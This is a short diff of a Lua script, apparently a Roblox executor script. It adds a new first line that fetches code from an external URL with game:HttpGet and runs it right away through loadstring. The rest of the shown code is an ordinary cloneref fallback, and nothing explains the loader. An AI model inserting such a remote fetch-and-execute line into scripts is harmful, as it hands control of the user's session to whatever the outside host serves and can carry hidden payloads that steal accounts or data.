@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://ivyy.lol/kongbai/nmnm"))() 
 local cloneref = (cloneref or clonereference or function(instance: any)
     return instance
 end)
